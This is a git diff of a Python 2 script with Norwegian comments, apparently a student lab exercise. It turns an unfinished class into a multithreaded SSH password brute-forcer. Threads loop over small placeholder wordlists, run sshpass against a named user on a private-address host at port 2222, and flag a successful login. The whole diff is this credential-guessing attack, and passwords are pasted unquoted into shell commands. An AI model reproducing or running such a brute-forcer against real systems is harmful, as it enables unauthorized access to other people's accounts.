@@ -1,54 +1,47 @@
+# coding=utf-8
 # 32-126 : 20-7E
-#
-import subprocess
+# Tråder: https://docs.python.org/2/library/threading.html
+# Queue: https://www.troyfawkes.com/learn-python-multithreading-queues-basics/
 
-password = []
-custom_ascii = [' ','!','\"','#','$','%','&','\'','(',')','*','+'',','-','.','/','0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?','@','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','[','\\',']','^','_','`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','{','|','}','~']
-
-class ASCII:
-    def __init__(self):
-        print ("Skriver til ASCII")
-
-    def build_pw(self):
-        cracked = bool(False)
-        while cracked:
-            print "Hallo"
+import threading
+import time
+import commands
 
 
+def connect_ssh(pword):
 
-class BruteForce:
+        for n in pword:
+            result = commands.getoutput("sshpass -p " + n + " ssh sigurda@10.225.147.156 -p 2222")
+            print "***********************************************"
+            print "Thread name: " + threading.current_thread().getName() + " | " + " Output: " + result
 
-    def __init__(self):
-        pass
+            if result.__contains__("Permission denied"):
+                print "Prøvd passord: " + n
+            else:
+                print "############ DET GIKK :D ############ Passord: " + n
 
-    def start_thread(self, password):
-        # Legg threadname/ID i en liste
-        # Hent nytt passord
-        # connect_ssh
-        # slett fra liste
-        # start ny tråd
-
-
-
-    def connect_ssh(self, pword):
-
-        output = subprocess.Popen(["./bf_script.sh hallo"], stdout=subprocess.PIPE, shell=True)
-        (outp, error) = output.communicate()
-        print "Output: ", outp
-        print "Error: ", error
-
-        proc = subprocess.Popen(["sshpass -p " + pword + " ssh -o StrictHostKeyChecking=no 10.225.147.156 -p 2222"], stdout=subprocess.PIPE, shell=True)
-        (out, err) = proc.communicate()
-        print "program output: ", out
-        print "program error: ", err
-
-        return
+def get_password(self):  # Bytt ut med fungerende passordgenerator
+        return "Lese fil og plukke ut passord med åtte bokstaver, legge passord i fire lister"
 
 
-# min main
+###### main ######
 
-pw = "hallo"
+pw1 = ["hei", "ikke", "gjør", "sånn"]
+pw2 = ["hallo", "kake", "lol", "bab"]
+pw3 = ["bror", "søster", "pappa", "mamma"]
 
-bf = BruteForce()
-bf.start_thread(pw)
-custom_ascii = (" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
+t1 = threading.Thread(target=connect_ssh, args=(pw1,))
+t2 = threading.Thread(target=connect_ssh, args=(pw2,))
+t3 = threading.Thread(target=connect_ssh, args=(pw3,))
+
+t1.start()
+t2.start()
+t3.start()
+
+time.sleep(100)
+
+t1.join()
+t2.join()
+t3.join()
+
+custom_ascii_STR = (" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
